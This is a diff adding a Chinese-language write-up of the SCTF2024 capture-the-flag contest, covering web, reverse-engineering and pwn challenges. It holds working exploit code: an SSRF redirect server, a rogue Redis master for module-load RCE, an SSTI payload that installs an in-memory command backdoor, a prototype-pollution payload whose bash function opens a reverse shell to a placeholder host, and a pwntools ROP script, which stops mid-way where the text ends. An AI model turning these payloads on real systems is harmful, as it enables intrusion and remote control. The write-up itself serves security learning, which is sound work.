@@ -1,0 +1,1608 @@
+---
+title: SCTF2024
+date: 2024-10-01
+---
+
+## 目录
+
+## Web
+
+### ezjump
+
+通过 docker-compose.yml 可以发现这里有三个服务，分别是 Next 的前端服务，flask 的后端服务，以及 redis 服务。
+
+直接搜索 Next cve,发现有一个很新的 CVE-2024-34351，在 redirect 的时候修改 Host 请求头和 Origin 可以造成 SSRF。
+
+![img](./img01.png)
+
+审计后端的 flask 代码可以发现就是一个用户注册登录的功能，在登录的账户身份为 admin 时可以执行 curl 命令。同时在存储用户信息时使用的是 redis，在 add_user 时的 SET 方法会在 pack_command 结束后将 pack 的数据中的 admin 替换为 hacker，这就造成了字符逃逸。通过构造用户名，将 username 所对应的 user_info_serialized 修改成自己想要的。
+
+```python
+params={
+    "username":"admin"*55+"\r\n$48\r\n"+"eyJwYXNzd29yZCI6ICIxMjMiLCAicm9sZSI6ICJhZG1pbiJ9",
+    "password":"test"
+}
+
+#adduser后，使用以下信息登录获取admin身份，并通过dict协议对redis进行读写：
+params={
+    "username":"hacker"*55,
+    "password":"123",
+    "cmd":"dict协议"
+}
+```
+
+通过 redis 主从复制 RCE，需要将 slave-read-only 设置为 no，这里在进行主从复制后需要重新再注册一个 admin 账户。
+
+ssrf server 代码：
+
+```python
+from flask import Flask, request, Response, redirect
+
+app = Flask(__name__)
+
+from urllib.parse import urlencode
+
+@app.route('/play')
+def exploit():
+    if request.method == 'HEAD':
+        response = Response()
+        response.headers['Content-Type'] = 'text/x-component'
+        return response
+    elif request.method == 'GET':
+        ssrfUrl = request.headers['ssrf']
+        params_key=request.headers['k']
+        if params_key=="test":
+            payload="/"
+        elif params_key=="test_user":
+            params={
+                "username":"test",
+                "password":"test"
+            }
+            payload="/login?"+urlencode(params)
+        elif params_key=="add_admin":
+            params={
+                "username":"admin"*55+"\r\n$48\r\n"+"eyJwYXNzd29yZCI6ICIxMjMiLCAicm9sZSI6ICJhZG1pbiJ9",
+                "password":"test"
+            }
+            payload="/login?"+urlencode(params)
+        elif params_key=="curl":
+            params={
+                "username":"hacker"*55,
+                "password":"123",
+                "cmd":"dict://172.11.0.4:6379/config:set:slave-read-only:no"
+                # "cmd":"dict://172.11.0.4:6379/config:set:dbfilename:exp.so"
+                # "cmd":"dict://172.11.0.4:6379/slaveof:vps:port",
+                # "cmd":"dict://172.11.0.4:6379/module:load:./exp.so"
+                # "cmd":"dict://172.11.0.4:6379/slaveof:no:one"
+                # "cmd":"dict://172.11.0.4:6379/system.rev:vps:port"
+            }
+            payload="/login?"+urlencode(params)
+        else:
+            payload=""
+        print(ssrfUrl+payload)
+        return redirect(ssrfUrl+payload)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8824, debug=True)
+```
+
+模拟主 redis 代码：
+
+```python
+import socket
+from time import sleep
+from optparse import OptionParser
+
+def RogueServer(lport):
+    resp = ""
+    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(("0.0.0.0",lport))
+    sock.listen(10)
+    conn,address = sock.accept()
+    sleep(5)
+    while True:
+        data = conn.recv(1024)
+        if "PING" in data:
+            resp="+PONG"+CLRF
+            conn.send(resp)
+        elif "REPLCONF" in data:
+            resp="+OK"+CLRF
+            conn.send(resp)
+        elif "PSYNC" in data or "SYNC" in data:
+            resp =  "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
+            resp += "$" + str(len(payload)) + CLRF
+            resp = resp.encode()
+            resp += payload + CLRF.encode()
+            if type(resp) != bytes:
+                resp =resp.encode()
+            conn.send(resp)
+            break
+
+if __name__=="__main__":
+
+    parser = OptionParser()
+    parser.add_option("--lport", dest="lp", type="int",help="rogue server listen port, default 21000", default=21000,metavar="LOCAL_PORT")
+    parser.add_option("-f","--exp", dest="exp", type="string",help="Redis Module to load, default exp.so", default="exp.so",metavar="EXP_FILE")
+
+    (options , args )= parser.parse_args()
+    lport = options.lp
+    exp_filename = options.exp
+
+    CLRF="\r\n"
+    payload=open(exp_filename,"rb").read()
+    print "Start listing on port: %s" %lport
+    print "Load the payload:   %s" %exp_filename
+    RogueServer(lport)
+
+```
+
+### ezRender
+
+简单代码审计后可以看出首先要获取一个 user 的 secret，进行 jwt 伪造 token 获取 admin 权限，然后通过 ssti 进行 RCE。但是 secret 生成是 10 位时间戳和从/dev/random 读取 22 个随机字节，这里/dev/random 产生的是真随机数，是由硬件的波动产生随机数，没有办法进行预测。但是注意到 setSecret 里有一个 try/except,这是如果 try 里产生一个错误，secret 就只会是十位时间戳，这个是可以预测的。但是尝试了很多种方式都没有办法造成异常。
+
+后来根据提示 ulimit -n =2048 说明只能打开 2048 个 fd,而每注册一个用户，它的 handle 是不关闭的，所以只要注册 2048 个以上的用户，那么再去注册新用户的时候 self.handler()就会抛出异常，secret 就会是 10 位时间戳。
+
+通过 burpsuite 发 2050 个包，找到返回时间最后的包，然后进行登录获取 token，再进行 jwt 伪造，弹出一些用户清理出一些 fd，然后进入到 ssti 模版注入。
+
+可以发现 ssti 这块存在 waf,但是不怎么严，首先第一步直接清空掉 waf 的 evilcode 列表。
+
+```python
+"code":"{{''.__class__.__base__.__subclasses__().__getitem__(133).__init__.__globals__.__builtins__.__import__('waf').evilcode.clear()}}"
+```
+
+然后尝试反弹 shell 发现不出网，注入内存马回显命令结果
+
+```python
+"code":'''{{
+        url_for.__globals__['__builtins__']['exec'](
+            'aa=app.after_request_funcs.setdefault(None, []);aa.clear();xx=lambda resp: CmdResp if request.args.get("cmd") and exec("global CmdResp;CmdResp=app.make_response(os.popen(request.args.get(\\\\"cmd\\\\")).read());")==None else resp  ;aa.append(xx);',
+            {
+            'request':request,
+            'app':url_for.__globals__['current_app'],
+            'os':url_for.__globals__.__builtins__.__import__('os')
+            }
+        )
+        }}
+        '''
+```
+
+### SycServer2.0
+
+访问靶机是一个登录页面，直接在前端输入用户名和密码尝试 sql 注入，发现不行。抓包发现，密码是用 rsa 加密的，同时在前端输入的时候进行了一些 SQL 的过滤，这也说明了应该是存在 SQL 注入的。将网页源代码中的过滤函数去掉，然后用本地覆盖网页源代码，使用万能密码 123' or 1=1 #发现登录成功，拿到了 auth_token。
+
+但是拿到了 token 没什么用，登录到一个欢迎页，除了一个图片欢迎语什么都没有。又尝试回到登录页进行 SQL 布尔注入，拿到了数据库的一些信息，但也没什么用，只有一张用户数据表和一条用户数据。
+
+就在一筹莫展时，突然想到为什么不扫一扫呢。于是扫描直接发现了 robots.txt 和/report 路由，/report 路由应该是发布什么东西的，看了看没什么东西。robots.txt 里有好东西，Disallow 是/ExP0rtApi?v=static&f=1.jpeg，直接访问是一串 base64，猜测这应该是可以任意文件读的。尝试路径穿越../发现还是获取的与原先一样，猜测是../被替换为空，这在当不输入 f 时的报错内容中的 replace 也相符。于是双写../，写成..././ 发现成功路径穿越，但是返回的字符串 base64 解码后是乱码。尝试读取不同的文件，发现解码后的数据文件头都是\x1f\x8b\x08\x00，搜索发现是 gzip 压缩文件，使用 gzip 解压后就是原本的文件了。
+
+接着就是尝试读取 flag 和环境变量的一些信息，读取 flag 发现提示需要 RCE，环境变量也没什么东西。然后就是读取源代码了
+
+源代码如下：
+
+```javascript
+const express = require("express");
+const fs = require("fs");
+var nodeRsa = require("node-rsa");
+const bodyParser = require("body-parser");
+const jwt = require("jsonwebtoken");
+const crypto = require("crypto");
+const SECRET_KEY = crypto.randomBytes(16).toString("hex");
+const path = require("path");
+const zlib = require("zlib");
+const mysql = require("mysql");
+const handle = require("./handle");
+const cp = require("child_process");
+const cookieParser = require("cookie-parser");
+
+const con = mysql.createConnection({
+  host: "localhost",
+  user: "ctf",
+  password: "ctf123123",
+  port: "3306",
+  database: "sctf",
+});
+con.connect((err) => {
+  if (err) {
+    console.error("Error connecting to MySQL:", err.message);
+    setTimeout(con.connect(), 2000); // 2秒后重试连接
+  } else {
+    console.log("Connected to MySQL");
+  }
+});
+
+const { response } = require("express");
+const req = require("express/lib/request");
+
+var key = new nodeRsa({ b: 1024 });
+key.setOptions({ encryptionScheme: "pkcs1" });
+
+var publicPem = `-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----`;
+var privatePem = `-----BEGIN PRIVATE KEY-----
+MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27
+PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l
+i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi
+6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI
+lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY
+Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61
+khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT
+6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78
+dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG
+mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye
+KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh
+UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l
+zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg
+xu/vfQ0A1jHRNC7t
+-----END PRIVATE KEY-----`;
+
+const app = express();
+app.use(bodyParser.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, "static")));
+app.use(cookieParser());
+
+var Reportcache = {};
+
+function verifyAdmin(req, res, next) {
+  const token = req.cookies["auth_token"];
+
+  if (!token) {
+    return res.status(403).json({ message: "No token provided" });
+  }
+
+  jwt.verify(token, SECRET_KEY, (err, decoded) => {
+    if (err) {
+      return res.status(403).json({ message: "Failed to authenticate token" });
+    }
+
+    if (decoded.role !== "admin") {
+      return res.status(403).json({ message: "Access denied. Admins only." });
+    }
+
+    req.user = decoded;
+    next();
+  });
+}
+
+app.get("/hello", verifyAdmin, (req, res) => {
+  res.send('<h1>Welcome Admin!!!</h1><br><img src="./1.jpeg" />');
+});
+
+app.get("/config", (req, res) => {
+  res.json({
+    publicKey: publicPem,
+  });
+});
+
+var decrypt = function (body) {
+  try {
+    var pem = privatePem;
+    var key = new nodeRsa(pem, {
+      encryptionScheme: "pkcs1",
+      b: 1024,
+    });
+    key.setOptions({ environment: "browser" });
+    return key.decrypt(body, "utf8");
+  } catch (e) {
+    console.error("decrypt error", e);
+    return false;
+  }
+};
+
+app.post("/login", (req, res) => {
+  const encryptedPassword = req.body.password;
+  const username = req.body.username;
+
+  try {
+    passwd = decrypt(encryptedPassword);
+    if (username === "admin") {
+      const sql = `select (select password from user where username = 'admin') = '${passwd}';`;
+      con.query(sql, (err, rows) => {
+        if (err) throw new Error(err.message);
+        if (rows[0][Object.keys(rows[0])]) {
+          const token = jwt.sign({ username, role: username }, SECRET_KEY, {
+            expiresIn: "1h",
+          });
+          res.cookie("auth_token", token, { secure: false });
+          res
+            .status(200)
+            .json({ success: true, message: "Login Successfully" });
+        } else {
+          res.status(200).json({ success: false, message: "Errow Password!" });
+        }
+      });
+    } else {
+      res
+        .status(403)
+        .json({ success: false, message: "This Website Only Open for admin" });
+    }
+  } catch (error) {
+    res
+      .status(500)
+      .json({ success: false, message: "Error decrypting password!" });
+  }
+});
+
+app.get("/ExP0rtApi", verifyAdmin, (req, res) => {
+  var rootpath = req.query.v;
+  var file = req.query.f;
+
+  file = file.replace(/\.\.\//g, "");
+  rootpath = rootpath.replace(/\.\.\//g, "");
+
+  if (rootpath === "") {
+    if (file === "") {
+      return res.status(500).send("try to find parameters HaHa");
+    } else {
+      rootpath = "static";
+    }
+  }
+
+  const filePath = path.join(__dirname, rootpath + "/" + file);
+
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).send("File not found");
+  }
+  fs.readFile(filePath, (err, fileData) => {
+    if (err) {
+      console.error("Error reading file:", err);
+      return res.status(500).send("Error reading file");
+    }
+
+    zlib.gzip(fileData, (err, compressedData) => {
+      if (err) {
+        console.error("Error compressing file:", err);
+        return res.status(500).send("Error compressing file");
+      }
+      const base64Data = compressedData.toString("base64");
+      res.send(base64Data);
+    });
+  });
+});
+
+app.get("/report", verifyAdmin, (req, res) => {
+  res.sendFile(__dirname + "/static/report_noway_dirsearch.html");
+});
+
+app.post("/report", verifyAdmin, (req, res) => {
+  const { user, date, reportmessage } = req.body;
+  if (Reportcache[user] === undefined) {
+    Reportcache[user] = {};
+  }
+  Reportcache[user][date] = reportmessage;
+  res
+    .status(200)
+    .send(
+      "<script>alert('Report Success');window.location.href='/report'</script>"
+    );
+});
+
+app.get("/countreport", (req, res) => {
+  let count = 0;
+  for (const user in Reportcache) {
+    count += Object.keys(Reportcache[user]).length;
+  }
+  res.json({ count });
+});
+
+//查看当前运行用户
+app.get("/VanZY_s_T3st", (req, res) => {
+  var command = "whoami";
+  const cmd = cp.spawn(command, []);
+  cmd.stdout.on("data", (data) => {
+    res.status(200).end(data.toString());
+  });
+});
+
+app.listen(3000, () => {
+  console.log("Server running on http://localhost:3000");
+});
+```
+
+审读代码后发现，RCE 的点应该就是在/VanZY_s_T3st，这里使用 child_process 的 spawn 方法执行了一个 whoami 命令。在之前发现的/report 路由存在原型链污染。一开始搜到一个通过污染 env 属性控制子进程的环境变量然后执行命令的，但是 command 必须是 node。后来想到了可以进行 bash 的环境变量注入：
+
+- Bash 4.4 以前：`env $'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"`
+- Bash 4.4 及以上：`env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'`
+
+在本地测试，污染环境变量成功，在子进程获取 process.env 是存在注入的环境变量的，我的 bash 版本是 4.2，写入的环境变量 BASH_FUNC_whoami()=() { id; }，但是没有反应，后来查看官方文档，发现在设置了 option 中设置 shell 变量为/bin/bash，同时设置环境变量后，确实命令执行结果变成了 id 的执行结果。同时尝试污染 shell 的属性，发现在 option 为空的时候还是不能执行想要的命令。
+
+就在想放弃的时候，峰回路转，我突然发现了 const handle = require('./handle'); 这和 handle 是一个相对路径的 js 文件，我通过任意文件读取 handle/index.js,发现是对 child_process 的 hook，同时文件里也引入了一个相对路径的./child_process.js 文件。
+
+```javascript
+var ritm = require("require-in-the-middle");
+var patchChildProcess = require("./child_process");
+
+new ritm.Hook(["child_process"], function (module, name) {
+  switch (name) {
+    case "child_process": {
+      return patchChildProcess(module);
+    }
+  }
+});
+function patchChildProcess(cp) {
+  cp.execFile = new Proxy(cp.execFile, { apply: patchOptions(true) });
+  cp.fork = new Proxy(cp.fork, { apply: patchOptions(true) });
+  cp.spawn = new Proxy(cp.spawn, { apply: patchOptions(true) });
+  cp.execFileSync = new Proxy(cp.execFileSync, { apply: patchOptions(true) });
+  cp.execSync = new Proxy(cp.execSync, { apply: patchOptions() });
+  cp.spawnSync = new Proxy(cp.spawnSync, { apply: patchOptions(true) });
+
+  return cp;
+}
+
+function patchOptions(hasArgs) {
+  return function apply(target, thisArg, args) {
+    var pos = 1;
+    if (pos === args.length) {
+      args[pos] = prototypelessSpawnOpts();
+    } else if (pos < args.length) {
+      if (hasArgs && (Array.isArray(args[pos]) || args[pos] == null)) {
+        pos++;
+      }
+      if (typeof args[pos] === "object" && args[pos] !== null) {
+        args[pos] = prototypelessSpawnOpts(args[pos]);
+      } else if (args[pos] == null) {
+        args[pos] = prototypelessSpawnOpts();
+      } else if (typeof args[pos] === "function") {
+        args.splice(pos, 0, prototypelessSpawnOpts());
+      }
+    }
+
+    return target.apply(thisArg, args);
+  };
+}
+
+function prototypelessSpawnOpts(obj) {
+  var prototypelessObj = Object.assign(Object.create(null), obj);
+  prototypelessObj.env = Object.assign(
+    Object.create(null),
+    prototypelessObj.env || process.env
+  );
+  return prototypelessObj;
+}
+
+module.exports = patchChildProcess;
+```
+
+主要看 patchOptions 函数，本题参数是['whoami',[]] ，args.length 是 2，同时 Array.isArray(args[pos])也是 true，所以 pos+=1,变为 2。这里很关键，由于 args 并没有进行原型的隔离操作，所以当访问 args[2]的时候，因为 args 本身不存在 2 这个 key，所以就会去原型上去找。如果污染了 object 的 2 的键值，那么就会把我们构造的 object 作为第三个参数 options 传入。
+
+所以构造如下的 json，使用 application/json 请求/report
+
+```javascript
+{
+    "user":"__proto__",
+    "date":2,
+    "reportmessage":{
+        "shell":"/bin/bash",
+        "env":{
+            'BASH_FUNC_whoami%%':"() { /bin/bash -i >& /dev/tcp/vps/port 0>&1 ; }"
+        }
+    }
+}
+```
+
+最后监听端口，然后访问/VanZY_s_T3st 就可以反弹 shell 了，执行/readflag 读取 flag
+
+## Reverse
+
+### bbox
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+#define SEED 0x11
+#define COUNT 40
+
+int main() {
+    srand(SEED);
+
+    for (int i = 0; i < COUNT; i++) {
+        printf("0x%x,", rand());
+    }
+
+    return 0;
+}
+```
+
+随机数获取后，发现输入后在.so 层获得的字符串是 base64 换表，且输入长度为 30 为正确的表，于是尝试输入不同的字符串，获取表，并对应，解得 flag
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+// 0x33, 0xC0, 0xC8, 0xA3, 0xF3, 0xBF, 0x1D, 0x1A,
+// 0x3B, 0x41, 0xB7, 0xC6, 0xF1, 0x5E, 0x86, 0x52,
+// 0x52, 0xCF, 0x6B, 0x1E, 0xC5, 0xF9, 0xCB, 0xBF,
+// 0xED, 0x7B, 0x62, 0xF1, 0xF7, 0x43, 0x48, 0x54,
+// 0xFB, 0x85, 0x4C, 0xD9, 0x35, 0x30, 0xF2, 0x6E
+// abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()
+// YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNE
+// LHX\MjKzM.|yJz(h1H-&IZmiI/wdF{F,GOyqv]Tl
+
+// U2hke2QzRFh7Mn1FXTsvaXM8eDJZODdoYyRcJzsh
+// r.|]G.vfwm|+W{dmOuh&JOWSGoXMUoFxLiwIXfh|
+//
+// UjtZakN7fEt+KCNDL0wxSWF8RlNOaGpJd3dUVjkz
+// r\(MJ]T+Dl(QYnToVg'5tHmSw}TUJjyXF/FrK\]f
+
+
+// WTB1X0ByZV9yMWdodF9yM3ZlcjUzX2lzX2Vhc3kh
+// HuqdOgqiMKPiWHFxFmPiW/M}I\rfO.}fO.K|I/]|
+// Y0u_@re_r1ght_r3ver53_is_easy!
+
+unsigned char rand_box[40] ={0xb9,0xad,0x7f,0x03,0x9f,0x0f,0xf1,0x67,0x79,0xb7,0x39,0xdd,0x93,0x88,0xae,0xea,0xb0,0x3d,0x7a,0x07,0xf2,0x89,0xe5,0x34,0x23,0x55,0xd8,0x4e,0xb7,0xda,0xec,0x71,0x88,0x6c,0x74,0x27,0x7b,0x65,0x8e,0xf5};
+unsigned char byte_B14[40] = {0x33, 0xC0, 0xC8, 0xA3, 0xF3, 0xBF, 0x1D, 0x1A,
+0x3B, 0x41, 0xB7, 0xC6, 0xF1, 0x5E, 0x86, 0x52,
+0x52, 0xCF, 0x6B, 0x1E, 0xC5, 0xF9, 0xCB, 0xBF,
+0xED, 0x7B, 0x62, 0xF1, 0xF7, 0x43, 0x48, 0x54,
+0xFB, 0x85, 0x4C, 0xD9, 0x35, 0x30, 0xF2, 0x6E
+};
+
+int encrypt(unsigned int seed) {
+    srand(0x11);
+    int len = 40;
+    int v10 = 0;
+    int v11 = 10;
+    int v14;
+    signed int v15;
+
+                    do{
+                        int a = rand_box[4*v10];
+                        // printf("%x\n",a );
+                        byte_B14[4*v10] ^= a;
+                        int b = rand_box[4*v10 +1];
+                        // printf("%x\n",b );
+                        byte_B14[4*v10+1] ^=b ;
+                        int c = rand_box[4*v10 +2];
+                        // printf("%x\n",c );
+                        byte_B14[4*v10+2] ^= c;
+                        //0x45773856
+                        int d = rand_box[4*v10 +3];
+                        // printf("%x\n",d );
+                        byte_B14[4*v10+3] ^= d;
+                        // printf("%x %x %x %x\n", byte_B14[4*v10], byte_B14[4*v10+1], byte_B14[4*v10+2], byte_B14[4*v10+3]);
+                        v14 = 32;
+                        v15 = byte_B14[4*v10] | (byte_B14[4*v10+1] << 8) | (byte_B14[4*v10+2] << 16) | (byte_B14[4*v10+3] << 24);
+                        // printf("%08x\n", v15);
+                        do {
+                          // printf("--%08x\n", v15);
+                            if (v15 >= 0)
+                                v15 *= 2;
+                            else
+                                v15 = (2 * v15) ^ 0x85B6874F;
+                            --v14;
+                        } while (v14);
+                        // printf("--%08x\n", v15);
+                        byte_B14[4 * v10] = v15 & 0xFF;
+                        byte_B14[4 * v10 + 1] = (v15 >> 8) & 0xFF;
+                        byte_B14[4 * v10 + 2] = (v15 >> 16) & 0xFF;
+                        byte_B14[4 * v10 + 3] = (v15 >> 24) & 0xFF;
+                        v10++;
+                        }while(v10 != v11);
+                        // }
+
+                }
+
+int deccrypt(unsigned int seed) {
+    int len = 40;
+    int v10 = 0;
+    int v11 = 10;
+    int v14;
+    signed int v15;
+    do{
+    v15 = byte_B14[4*v10] | (byte_B14[4*v10+1] << 8) | (byte_B14[4*v10+2] << 16) | (byte_B14[4*v10+3] << 24);
+    v14 = 32;
+    do{
+      // printf("++%x , %d\n", v15,v15&1);
+      if ((v15 & 1) == 0){
+        v15 = (v15 >> 1) & 0x7FFFFFFF;
+      }else{
+        v15 = ((v15 ^0x85B6874F)>>1)|0x80000000;
+      }
+      --v14;
+    }while(v14);
+    // printf("++%08x\n", v15);
+    byte_B14[4*v10] = v15 & 0xFF;
+    byte_B14[4*v10+1] = (v15 >> 8) & 0xFF;
+    byte_B14[4*v10+2] = (v15 >> 16) & 0xFF;
+    byte_B14[4*v10+3] = (v15 >> 24) & 0xFF;
+    // printf("%08x\n", v15);
+    byte_B14[4*v10] ^= rand_box[4*v10];
+    byte_B14[4*v10+1] ^= rand_box[4*v10+1];
+    byte_B14[4*v10+2] ^= rand_box[4*v10+2];
+    byte_B14[4*v10+3] ^= rand_box[4*v10+3];
+    for (int i = 0; i <4 ; i++)
+    {
+      printf("%c",byte_B14[4*v10+i]);
+    }
+    v10++;
+    }while (v10 <10);
+
+
+}
+int main() {
+    // encrypt(0x11);
+    deccrypt(0x11);
+    return 0;
+}
+```
+
+### ez_cython
+
+谁家语言大整数 30 位 30 位的存啊
+
+解包得到 python 源码，发现调用了 cy.sub14514(guess_hex) ，逆 cy.pyd
+
+通过 dir 等命令，得到 cy 中的类和函数，并动调恢复整体加密逻辑
+
+```python
+class QOOQOOQOOQOOOQ(object):
+
+    def __init__(self):
+        self.name = 1
+
+    def get_key(self):
+        return [83, 121, 67, 49, 48, 86, 101, 82, 102, 48, 82, 86, 101, 114]   # b'SyC10VeRf0RVer'
+
+def sub50804(a, b, c, d, e, f):     # cy.sub50804(1,1,1,[1],2,2) == 12
+    return (((a>>3)^(b<<3))+ ((a<<2)^(b>>4))) ^ ((d[(e&2)^f]^a)+ (b^c))
+
+
+def sub50520(T7T77T77T7T7TT, key):
+    v = T7T77T77T7T7TT.copy()
+    round = 6 + 52//len(v)
+    delta = 0   #0x21E3779B9
+    a = v[-1]
+
+    for i in range(0,round,1):
+        delta = (delta+0x21E3779B9)&0xfFFFFFFF
+        print(hex(delta))
+        e = ((delta)>>3)&3
+        for j in range(len(v)-1):
+            b = v[j+1]
+            mx = sub50804(a,b,delta,key,j,e)
+            v[j] = (v[j]+mx)&0xfFFFFFFF
+            a = v[j]
+        b = v[0]
+        mx = sub50804(a,b,delta,key,j,e)
+        v[-1] = (v[-1]+mx)&0xfFFFFFFF
+        a = v[-1]
+        for kk in range(len(v)):
+            print(hex(v[kk])[2:],end=' ')
+        print()
+
+def sub14514(nmnmnnnmnmmnmmnn):
+    key = QOOQOOQOOQOOOQ.get_key()
+    m = [0x334e984ac, 0x30af0191d, 0x1176ffc19, 0xef90939, 0x1185c0e45, 0x12eaa8337, 0x1217f6b89, 0x3355432a7, 0x2281cb817, 0x23f1ee8c3, 0x1256309c6, 0x212ace1cc, 0x20efeb57e, 0x39c000bb, 0x10d650916, 0x12a78dba7, 0x32ba5c0a3, 0x212fdb0f3, 0x334b5dea2, 0x3a800002e7098d9, 0x1112df304, 0x3060e9667, 0x335b523ec, 0x13c8eb381, 0x12720ac77, 0x238939ede, 0x20428a41a, 0x288ac504, 0x30a50bcfd, 0x22992ba6f, 0x10222d1a6, 0x2076c84df]
+    a = nmnmnnnmnmmnmmnn.copy()
+    n = sub50520(a,key)
+    print("result:")
+    for i in range(len(n)):
+        print(hex(n[i])[2:],end=' ')
+    print()
+```
+
+很容易看出来是一个魔改的 xxtea，但是数字不对，放一个最终提取密文的 idc 脚本
+
+```c
+// 创建数组元素
+auto array_ptr = CreateArray("array");
+// 获取数组指针
+auto ptr = GetArrayId("array");
+
+auto addr = 0x1DC0A6BD930;
+auto a,i,j;
+for(i=0;i<32;i++){
+    a = Qword(addr+8*i);
+    //SetArrayLong(ptr,i,Qword(a+24));
+    if(Qword(a+16)==1){
+        Message("0x%x, ",Dword(a+24));
+    }
+    else{
+        j = Qword(a+24);
+        j = (j>>32)<<30 | (j&0xffffffff);
+        Message("0x%x, ",j);
+    }
+
+}
+
+Message("\n");
+```
+
+解密脚本
+
+```python
+a = [0xf4e984ac, 0xcaf0191d, 0x576ffc19, 0x2ef90939, 0x585c0e45, 0x2eaa8337, 0x617f6b89, 0xf55432a7, 0xa81cb817, 0xbf1ee8c3, 0x656309c6, 0x92ace1cc, 0x8efeb57e, 0x39c000bb, 0x4d650916, 0x6a78dba7, 0xeba5c0a3, 0x92fdb0f3, 0xf4b5dea2, 0x2e7098d9, 0x112df304, 0xc60e9667, 0xf5b523ec, 0x7c8eb381, 0x2720ac77, 0xb8939ede, 0x8428a41a, 0x288ac504, 0xca50bcfd, 0x2992ba6f, 0x4222d1a6, 0x876c84df]
+a2 = [83, 121, 67, 49]
+v5 = 0x9E3779B9
+n = 60//len(a) + 4
+v8 = v5*n
+v9 = a[len(a)-1]
+for i in range(n):
+    j = len(a)-2
+    v9 = a[j]
+    v6 = (v8>>3) & 3
+    a[len(a)-1] = (a[len(a)-1] - (((v9 ^ a2[v6 ^ ((j+1) & 2)]) + (a[0] ^ v8)) ^ (((4 * v9) ^ (a[0] >> 4)) + ((8 * a[0]) ^ (v9 >> 3))))) & 0xffffffff
+    while(j>0):
+        v9 = a[j-1]
+        a[j] = (a[j] - (((v9 ^ a2[v6 ^ (j & 2)]) + (a[j+1] ^ v8)) ^ (((4 * v9) ^ (a[j+1] >> 4)) + ((8 * a[j+1]) ^ (v9 >> 3))))) & 0xffffffff
+        j -= 1
+    v9 = a[len(a)-1]
+    a[0] = (a[0] - (((v9 ^ a2[v6 ^ (j & 2)]) + (a[j+1] ^ v8)) ^ (((4 * v9) ^ (a[j+1] >> 4)) + ((8 * a[j+1]) ^ (v9 >> 3))))) & 0xffffffff
+    v8 -= v5
+
+for i in range(32):
+   print(chr(a[i]>>24&0xff),chr(a[i]>>16&0xff),chr(a[i]>>8&0xff),chr(a[i]&0xff),end='',sep='')
+print()
+```
+
+## Pwn
+
+### factory
+
+```python
+#! /usr/bin/python3
+from pwn import *
+#pyright: reportUndefinedVariable=false
+
+context.os = 'linux'
+context.arch = 'amd64'
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+elf=ELF("./factory")
+libc=ELF("./libc.so.6")
+
+debug = 0
+
+if debug:
+    io = process('./factory')
+    #io = remote('0.0.0.0',9999)
+else:
+    io = remote('1.95.81.93',57777)
+
+def p():
+    gdb.attach(proc.pidof(io)[0])
+
+#p()
+io.recvuntil("How many factorys do you want to build: ")
+# p()
+io.sendline(str(0x20))
+
+# io.recvuntil("fa")
+for i in range (18):
+    io.recvuntil("fa")
+    io.sendline(str(0x1))
+
+# p()
+io.recvuntil("fa")
+io.sendline(str(19+5))
+
+puts_plt=elf.plt[b'puts']
+puts_got=elf.got[b'puts']
+rdi=0x0000000000401563
+
+io.recvuntil("fa")  #25
+io.sendline(str(rdi))
+io.recvuntil("fa")
+io.sendline(str(puts_got))
+io.recvuntil("fa")
+io.sendline(str(puts_plt))
+
+io.recvuntil("fa")
+io.sendline(str(0x401303))
+
+for i in range(3):
+    io.recvuntil("fa")
+    io.sendline(str(1))
+
+io.recvuntil("The tons of parts")
+io.recvuntil("\n")
+
+libc_base=u64(io.recv(6).ljust(8,b'\x00'))-libc.symbols[b'puts']
+print("libc_base="+hex(libc_base))
+
+for i in range (18+1):
+    io.recvuntil("fa")
+    io.sendline(str(0x1))
+
+# p()
+io.recvuntil("fa")
+io.sendline(str(19+5))
+
+system=libc_base+libc.symbols[b'system']
+binsh=libc_base+next(libc.search(b'/bin/sh'))
+
+io.recvuntil("fa")
